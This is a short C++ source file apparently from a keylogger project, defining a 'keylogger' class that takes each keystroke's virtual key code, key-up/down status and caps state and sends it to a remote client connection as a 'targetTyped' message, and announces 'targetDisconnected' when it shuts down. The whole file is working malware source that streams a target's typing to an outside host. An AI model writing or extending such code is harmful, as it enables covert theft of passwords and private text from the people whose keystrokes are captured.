#include "keylogger.h"

keylogger::keylogger() : client(&validation_function) {}

keylogger::~keylogger() {
    kq::message<messageType> msg(messageType::targetDisconnected);
    client.Send(msg);
    client.Disconnect();
}

void keylogger::handleKeyStroke(DWORD virtualKeyCode, keyStatus status,
                                bool caps) {
    kq::message<messageType> msg(messageType::targetTyped);
    msg << virtualKeyCode << status << caps;
    client.Send(msg);
}